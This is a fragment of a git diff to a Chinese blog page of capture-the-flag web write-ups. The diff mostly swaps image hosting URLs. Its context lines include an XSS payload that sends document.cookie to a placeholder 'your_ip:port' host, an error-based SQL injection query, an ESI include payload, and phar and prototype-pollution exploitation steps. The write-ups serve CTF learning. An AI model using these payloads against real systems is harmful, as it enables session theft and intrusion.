 &lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">window.location=&amp;#34;http://your_ip:port?c=&amp;#34;+document.cookie;
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002591.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002591.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>再给几个其他师傅绕过的 payload :&lt;/p>
@@ -26550,7 +26550,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>访问&lt;code>admin&lt;/code>，使用&lt;code>admin/12345678&lt;/code>成功登录，登录后有一个搜索功能&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009845.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009845.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>结合页面&lt;code>thinkphp 3.2&lt;/code>的框架漏洞，使用以下 payload 逐渐获得 flag&lt;/p>
@@ -26596,16 +26596,16 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="w">&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">count&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">select&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="k">SELECT&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">concat&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="n">x7e&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">FROM&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">flag&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">limit&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="n">floor&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">rand&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="o">*&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="p">))&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">from&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">information_schema&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="n">tables&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">group&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="k">by&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">)&lt;/span>&lt;span class="n">a&lt;/span>&lt;span class="w">
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003705.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003705.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002276.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002276.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004079.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004079.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009741.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009741.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>结果发现提交不对，然后看了其他师傅的 wp 发现少了一位，然后搜了一下相关资料，应该是限制了输出&lt;/p>
@@ -26688,7 +26688,7 @@ loading="lazy"
 &lt;/h3>&lt;blockquote>
 &lt;p>​ Run your javascript code inside this page and preview it because of hackers we have only limited functions&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003267.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003267.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目内容如上，比较简单的 javascript 代码运行，后台是 Node.js&lt;/p>
@@ -26726,12 +26726,12 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>然而当我们想直接反弹 shell （那当然是太天真了），就返回了&lt;code>not defined&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009658.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009658.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>所以没那么简单，那我们先从信息收集开始，使用&lt;code>Error().stack&lt;/code>可以收集使用的模块信息，而且题目设置是可以直接把内容输出出来的，所以我们不需要&lt;code>print&lt;/code>，可以直接输出信息。&lt;/p>
 &lt;p>我们首先先收集目标信息，使用&lt;code>js=Error().stack&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007444.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007444.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们可以得到题目设置的模块，如&lt;code>vm.js&lt;/code>，然后发现对应的&lt;a class="link" href="https://github.com/patriksimek/vm2" target="_blank" rel="noopener"
@@ -26776,7 +26776,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>直接作为 payload 使用，发现可以成功执行命令&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001558.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001558.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>接下来直接读 flag 就好了，得到&lt;/p>
@@ -26792,33 +26792,33 @@ loading="lazy"
 &lt;/h3>&lt;blockquote>
 &lt;p>​ Its just a blog&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008750.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008750.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目是一个 Node.js ，题目设置比较简单，就一个表单，提交之后参数会得到相应的页面&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003012.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003012.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>以及还有一个 admin 界面&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000941.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000941.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>index 界面输入什么就以 HTML 形式返回什么，也可以触发 XSS&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007194.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007194.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这只是一个 self-xss ，这就显得又些鸡肋了，所以大概意思就是我们需要用 index 做 xss 或者其他一些操作去获取管理员权限&lt;/p>
 &lt;p>跟上题一样，既然都是 Node.js ，是不是也可以得到一些错误信息什么的。&lt;/p>
 &lt;p>在尝试了一些单引号、双引号等一些特殊符号，发现确实是全部都转换成 string 输出了，猜想是不是有类似&lt;code>toString()&lt;/code>的操作，换成数组测试，发现无回显，一直停留在 pending 状态中&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002458.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002458.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试直接访问 /edge 页面，得到错误信息&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000829.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000829.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是这都是用于前端效果的 js 库，并没有什么用，但是思路应该是没错的，继续 fuzz 就行了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007151.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007151.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>最终用&lt;code>title=1&amp;amp;description[a]=1&lt;/code>得到了比较有用的报错信息，得到了一个新的库 esi.js ，查看相关资料&lt;a class="link" href="https://www.npmjs.com/package/esi" target="_blank" rel="noopener"
@@ -26858,7 +26858,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">title&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="o">&amp;amp;&lt;/span>&lt;span class="n">description&lt;/span>&lt;span class="o">=&amp;lt;&lt;/span>&lt;span class="n">esi&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Ainclude&lt;/span>&lt;span class="o">+&lt;/span>&lt;span class="n">src&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">D&lt;/span>&lt;span class="s2">&amp;#34;http%3A&lt;/span>&lt;span class="si">%2F%2F&lt;/span>&lt;span class="s2">website.com&lt;/span>&lt;span class="si">%2F&lt;/span>&lt;span class="s2">admin&amp;#34;&lt;/span>&lt;span class="o">&amp;gt;&amp;lt;%&lt;/span>&lt;span class="mi">2&lt;/span>&lt;span class="n">Fesi&lt;/span>&lt;span class="o">%&lt;/span>&lt;span class="mi">3&lt;/span>&lt;span class="n">Ainclude&lt;/span>&lt;span class="o">&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002608.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002608.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="mime-checkr">mime checkr
@@ -26866,15 +26866,15 @@ loading="lazy"
 &lt;p>​ upload and check the mime type&lt;/p>
 &lt;p>Hint1: Do you think containers could speak like humans?&lt;/p>
 &lt;/blockquote>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009076.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009076.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>题目设置为有一个上传点，只允许上传 .jpeg 后缀的文件，尝试了一下其他截断，均不能上传其他文件&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006334.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006334.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>还有一个获取 MIME 格式的功能，需要传入路径，返回 MIME 格式&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001038.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001038.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>还有一个备份文件&lt;code>getmime.bak&lt;/code>&lt;/p>
@@ -27063,18 +27063,18 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>修改后缀名为 .jpeg ，通过访问&lt;code>phar://uploads/f68caba0b9.jpeg/test.txt&lt;/code>，成功获得了&lt;code>file:///etc/passwd&lt;/code>的内容。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003709.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003709.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007837.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007837.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>但是我们如何找 flag 呢，这里其实是比较坑的一个点，其实基本漏洞利用点已经找到了，接下来其实感觉是有些多余的出题设置，通过试探一些常用的 flag 目录路径，都没有找到 flag ，而后在&lt;code>/etc/hosts&lt;/code>发现了同一个网段的另一台主机。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000059.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000059.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>如图中的&lt;code>192.168.32.2 7eaef799a0b8&lt;/code>，猜想是不是在 192.168.32.0/24 这个段上，或者比较靠前的机器上，当尝试到 192.168.32.3 时，发现有不寻常的返回。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006681.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006681.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看着有点像用 python 加密出来的东西，搜了一下发现是使用了一个叫&lt;code>ebcdic&lt;/code>的 python 库，用了&lt;code>cp1047&lt;/code>编码。&lt;/p>
@@ -27092,11 +27092,11 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>得到&lt;code>Hello /fetch~%[]^@)( me&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001714.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001714.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>感觉是个 url 之类的，再构造 phar 包，访问 &lt;code>http://192.168.32.3/fetch~%25%5B%5D%5E%40)(&lt;/code>，得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005654.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005654.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>看起来是同样的加密，直接解密就可以了。&lt;/p>
@@ -27113,7 +27113,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>最后得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008048.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008048.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="credz">credz
@@ -27135,11 +27135,11 @@ loading="lazy"
 &lt;pre tabindex="0" class="chroma">&lt;code class="language-html" data-lang="html">&lt;span class="line">&lt;span class="cl">&lt;span class="c">&amp;lt;!-- remember me all the time, credz is not what you need luke --&amp;gt;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005677.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005677.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>尝试了一下 sql 注入，并没有注入点，在尝试弱密码的时候使用&lt;code>admin/admin&lt;/code>登录成功，但是页面提示&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008681.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008681.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>很直接，让我们伪造 admin 的 cookie ，这就需要我们另寻突破口了，在主页面发现一个貌似用来设置 cookie 的 js 文件：&lt;/p>
@@ -27690,24 +27690,24 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>所以通过这些几个设置，我们就可以得到&lt;code>trackuser.php&lt;/code>中请求参数&lt;code>m&lt;/code>的值为 2656613544186699742 ，发包得到对应的 Cookie&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002177.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002177.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>带着 Cookie 登录 &lt;code>admin/admin&lt;/code>，得到下一步&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001527.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001527.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>直接访问，发现是个目录列举。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000655.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000655.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>直接访问&lt;code>admin.php&lt;/code>，发现&lt;code>not_authorized&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003830.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003830.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>而&lt;code>pack-9d392b4893d01af61c5712fdf5aafd8f24d06a10.pack&lt;/code>文件则可以直接下载，我们可以通过&lt;a class="link" href="http://du1abadd.org/2010/git-tips-%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA-pack-%E6%96%87%E4%BB%B6%E6%81%A2%E5%A4%8D%E6%95%B4%E4%B8%AA%E7%B3%BB%E7%BB%9F/" target="_blank" rel="noopener"
 >git tips 只有一个 pack 文件恢复整个系统&lt;/a>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005313.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005313.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>得到&lt;code>admin.php&lt;/code>文件&lt;/p>
@@ -27766,7 +27766,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>简单审计，获取路径后检查&lt;code>index.php&lt;/code>是否存在路径当中，我们用&lt;code>admin.php/index.php&lt;/code>就可以简单绕过得到 flag&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005096.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005096.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="proton">proton
@@ -27779,23 +27779,23 @@ loading="lazy"
 &lt;/ul>
 &lt;/blockquote>
 &lt;p>题目设置&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009953.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009953.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>访问&lt;code>/getPOST&lt;/code>又得到&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009992.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009992.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>添加&lt;code>id&lt;/code>参数访问&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005714.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005714.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>单引号尝试注入，发现报错&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006739.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006739.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>注入无果后，看了一下发现是个 Node.js 的站，尝试使用之前的 payload 检查错误信息&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009819.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009819.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然而并没有发现什么可疑的js库，而且题目既然给出了不是 sql 注入的话，我们就需要得另找方向。&lt;/p>
@@ -28012,7 +28012,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>需要我们将&lt;code>const admin&lt;/code>的&lt;code>admin&lt;/code>属性设置为1，比较明显的一个 js 原型链污染，我们只需要让一个&lt;code>Object.prototype&lt;/code>设置为&lt;code>{&amp;quot;admin&amp;quot;:1}&lt;/code>即可，而我们还需要一个&lt;code>name&lt;/code>参数，所以我们大致可以这样构造：&lt;code>{&amp;quot;name&amp;quot;: &amp;quot;xxx&amp;quot;, &amp;quot;__proto__&amp;quot;:{&amp;quot;аdmin&amp;quot;:&amp;quot;1&amp;quot;}}&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610001862.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610001862.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>在第二个for循环中，由于&lt;code>__proto__&lt;/code>是一个&lt;code>Object&lt;/code>，会递归进入&lt;code>merge()&lt;/code>，由于&lt;code>__proto__&lt;/code>有一对&lt;code>key-value&lt;/code>，所以会判断&lt;code>__proto__[&amp;quot;admin&amp;quot;]&lt;/code>是否是&lt;code>Object&lt;/code>，不是就进入&lt;code>else&lt;/code>，对原型&lt;code>__proto__[&amp;quot;admin&amp;quot;]&lt;/code>赋值为1，这就完成了原型链污染的操作。&lt;/p>
@@ -28051,29 +28051,29 @@ loading="lazy"
 &lt;/div>&lt;h4 id="信息收集">信息收集
 &lt;/h4>&lt;p>根据题目描述，我们要做的肯定就是要去登录&lt;code>admin[1-4] || admin&lt;/code>了。&lt;/p>
 &lt;p>首先进入题目界面，发现题目功能很简单，首页只提供注册登录两个功能。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610008462.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610008462.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006729.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006729.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>我们先随便登录注册一下，进去后发现有个重置密码的功能。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006219.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610006219.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000480.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000480.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>重置一下抓包看看。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007019.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007019.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>然后真的发现自己邮箱里面多了一封重置密码的邮件。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610004224.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610004224.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>扫目录可以得到&lt;code>www.zip&lt;/code>，发现题目的所有基本源码。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610002659.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610002659.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h4 id="思路">思路
@@ -28337,7 +28337,7 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
 &lt;/div>&lt;p>猜解得到密码登录就可以得到&lt;code>flag&lt;/code>&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610000323.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610000323.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>这里避免给大家竞争随机…就给了5个&lt;code>amdin&lt;/code>，其实应该注册一个就对应给一个&lt;code>admin&lt;/code>，但是感觉5个应该差不多了&amp;hellip;&lt;/p>
@@ -28361,15 +28361,15 @@ loading="lazy"
 &lt;/div>
 &lt;/div>&lt;h4 id="信息收集-1">信息收集
 &lt;/h4>&lt;p>题目设置非常简单&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005541.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005541.jpg"
 loading="lazy"
 >&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610003674.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610003674.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>就一个登录注册界面。然后给了一个&lt;code>www.zip&lt;/code>的附件，放出了关键源码。&lt;/p>
 &lt;p>然后，随便点一个选课，就报错了。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610007526.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610007526.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;p>再看看源码，其中在&lt;code>user.py&lt;/code>中发现&lt;/p>
@@ -28558,26 +28558,26 @@ loading="lazy"
 &lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">&amp;#39;NUAACTF&lt;/span>&lt;span class="si">{F14sssskkkrrr_D3Bug_n0t_S4f3}&lt;/span>&lt;span class="s1">&amp;#39;&lt;/span>
 &lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
 &lt;/div>
-&lt;/div>&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610005783.jpg"
+&lt;/div>&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610005783.jpg"
 loading="lazy"
 >&lt;/p>
 &lt;h3 id="web3----张哥的金牌之旅">Web3 张哥的金牌之旅
 &lt;/h3>&lt;h4 id="题目描述-2">题目描述
 &lt;/h4>&lt;h4 id="信息收集-2">信息收集
 &lt;/h4>&lt;p>打开发现是个&lt;code>java&lt;/code>框架。&lt;/p>
-&lt;p>&lt;img src="https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610009939.jpg"
+&lt;p>&lt;img src="https://blogpic.zdy.one/img/20190610009939.jpg"
 loading="lazy"
 >&lt;/p>
